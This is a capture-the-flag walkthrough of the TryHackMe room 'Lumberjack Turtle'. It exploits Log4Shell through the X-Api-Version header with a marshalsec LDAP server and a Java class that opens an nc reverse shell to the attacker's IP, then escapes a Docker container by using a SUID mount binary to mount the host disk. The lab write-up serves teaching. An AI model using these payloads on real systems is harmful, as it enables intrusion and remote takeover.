[Home](../../index.md)

# TryHackMe: Lumberjack Turtle

https://tryhackme.com/room/lumberjackturtle

---
## Enumeration

Port scans

```
┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle]
└─$ rustscan -a 10.10.95.20 -r 1-65535                                
Open 10.10.95.20:22
Open 10.10.95.20:80

┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle]
└─$ nmap -p 22,80 -sV -sC 10.10.95.20             

PORT   STATE SERVICE     VERSION
22/tcp open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6a:a1:2d:13:6c:8f:3a:2d:e3:ed:84:f4:c7:bf:20:32 (RSA)
|   256 1d:ac:5b:d6:7c:0c:7b:5b:d4:fe:e8:fc:a1:6a:df:7a (ECDSA)
|_  256 13:ee:51:78:41:7e:3f:54:3b:9a:24:9b:06:e2:d5:14 (ED25519)
80/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
## HTML

```
┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle]
└─$ sudo feroxbuster -u http://10.10.95.20 -w /usr/share/wordlists/dirb/common.txt -x txt,php
[sudo] password for kali: 

200        1l        6w       29c http://10.10.95.20/~logs
500        1l        1w        0c http://10.10.95.20/error
```

Browsing to `/~logs` reveals this message:

```
No logs, no crime. Go deeper.
```

So let's go deeper.

```
┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle]
└─$ sudo feroxbuster -u http://10.10.95.20/~logs -w /usr/share/wordlists/dirb/common.txt -x txt,php

200        1l        8w       47c http://10.10.95.20/~logs/log4j
```

Browsing to `/~logs/log4j`

```
Hello, vulnerable world! What could we do HERE?
```

If we capture this request in BurpSuite, we see this in the response headers.

```
X-THM-HINT: CVE-2021-44228 against X-Api-Version
```

---
## Log4Shell

So we know this is vulnerable to log4shell via the `X-Api-Version` HTTP header.

I attempted here to use Metasploit to gain access.  It said I got a shell as root, but I could not see anything in `/home` or `/root`, I assume there's something I was missing or did not understand.  Eventually I decided to do this manually, we'll learn more this way anyway.

I will use the methodology outlined by John Hammond on his [Solar room](https://tryhackme.com/room/solar).

In our first terminal:

```
┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle]
└─$ git clone https://github.com/mbechler/marshalsec   
                                                                                   
┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle]
└─$ cd marshalsec            
                                                                                              
┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle/marshalsec]
└─$ sudo apt install maven

┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle/marshalsec]
└─$ mvn clean package -DskipTests

┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle/marshalsec]
└─$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.13.18.7:8000/#Exploit"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
```

Second terminal:

```
┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle]
└─$ vim Exploit.java  
                                                                                       
┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle]
└─$ cat Exploit.java         
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc 10.13.18.7 9999 -e /bin/sh");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}


┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle]
└─$ sudo apt install default-jdk

┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle]
└─$ javac Exploit.java -source 8 -target 8
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
warning: [options] bootstrap class path not set in conjunction with -source 8
1 warning
```

Now in two separate terminals, we need to start an HTTP server (to host our newly created .class file), and a netcat listener (to catch the shell).

```
┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle]
└─$ python3 -m http.server
```

```
┌──(kali㉿kali)-[~/tryhackme/lumberjackturtle]
└─$ nc -lvnp 9999                          
listening on [any] 9999 ...
```

Now all we need to do is send the payload to the vulnerable webpage in the vulnerable `X-Api-Version` header.

```
GET /~logs/log4j HTTP/1.1
Host: 10.10.95.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
X-Api-Version: ${jndi:ldap://10.13.18.7:1389/Exploit}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

---
## Flag 1

This gets us a very limited shell.  I wasn't even able to upgrade it.

Using `find` I was easily able to get the first flag.

```
find / -iname "*flag*" 

...

/opt/.flag1
```

---
## Privilege Escalation

When listing `/`, we can see that we are in a docker container.

```
ls -a /
.
..
.dockerenv

....etc...
```

Looking at SUID files, we see that we can `mount` and `umount`.

```
find / -type f -perm -u=s 2>/dev/null | xargs ls -l
-rwsr-xr-x    1 root     root         38848 May  1  2018 /bin/mount
-rwsr-xr-x    1 root     root         26552 May  1  2018 /bin/umount
```

Let's try to break out of our container by mounting the filesystem of the parent machine.

```
mkdir /mnt/tmp
mount /dev/xvda1 /mnt/tmp
ls /mnt/tmp
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

---
## Flag 2

Now let's search that directory using `-iname`.

```
find /mnt/tmp -iname "*flag*" 
/mnt/tmp/root/.../._fLaG2
```